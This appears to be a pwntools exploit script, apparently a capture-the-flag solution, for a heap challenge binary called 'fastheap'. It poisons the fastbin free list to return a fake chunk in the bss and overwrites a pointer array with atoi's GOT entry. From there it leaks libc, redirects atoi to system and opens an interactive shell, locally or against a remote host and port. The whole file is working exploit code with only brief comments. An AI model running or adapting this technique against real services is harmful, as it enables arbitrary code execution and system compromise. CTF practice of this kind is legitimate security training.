from pwn import *

atoi_got = 0x602068
atoi_off = 0x39ea0
sys_off  = 0x46590

def alloc(data):

	r.sendlineafter('>> ', '1')
	r.sendlineafter('Data: ', data)

	return

def edit(idx, data):

	r.sendlineafter('>> ', '2')
	r.sendlineafter('Index: ', str(idx))
	r.sendlineafter('Data: ', data)

	return

def dump(idx):

	r.sendlineafter('>> ', '3')
	r.sendlineafter('Index: ', str(idx))

	r.recvuntil('Data: ')
	return u64(r.recv(6).ljust(8, '\x00'))

def free(idx):

	r.sendlineafter('>> ', '4')
	r.sendlineafter('Index: ', str(idx))

	return

def intro(data):

	r.sendlineafter('>> ', '5')
	r.sendlineafter('Name: ', data)

	return

def pwn():

	alloc('A'*8) # 0
	alloc('B'*8) # 1
	alloc('C'*8) # 2

	free(0)
	free(1)

	# Craft a fake chunk in the bss
	intro(p64(0)*13 + p64(0x50))

	# fastbin's fd => fake chunk 
	edit(1, p64(0x602120))

	# malloc will return a fastbin
	alloc('D'*8)
	# malloc will return our fake chunk
	# and we will overwrite the 0th entry
	# of the heap array with atoi's GOT entry
	alloc(p64(0)*2 + p64(atoi_got))

	atoi   = dump(0)
	libc   = atoi - atoi_off
	system = libc + sys_off

	log.success("atoi:   0x{:x}".format(atoi))
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(system))

	# atoi => system
	edit(0, p64(system))

	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./fastheap')
        pause()
        pwn()
